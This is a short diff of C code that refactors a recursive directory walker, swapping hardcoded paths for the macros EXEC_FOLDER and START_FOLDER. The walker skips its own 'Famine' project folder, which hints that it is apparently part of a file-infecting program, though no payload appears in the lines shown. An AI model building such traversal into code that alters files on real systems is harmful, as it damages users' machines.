@@ -42,7 +42,7 @@ int open_file(char *name_file) {
 void enter_folder(char *folder) {
     struct dirent *dir;
 
-    if (!strcmp(folder, "/home/zarbiy/Documents/Famine"))
+    if (!strcmp(folder, EXEC_FOLDER))
         return ;
 
     DIR *d = opendir(folder);
@@ -83,14 +83,10 @@ void enter_folder(char *folder) {
 }
 
 int main() {
-    char *name_folder[] = {"/tmp/test", NULL};
+    char *name_folder[] = {START_FOLDER, NULL};
     int i = 0;
 
     while (name_folder[i]) {
-        if (!strcmp(name_folder[i], "/home/zarbiy/Documents/Famine")) {
-            i++;
-            continue ;
-        }
         enter_folder(name_folder[i]);
         i++;
     }
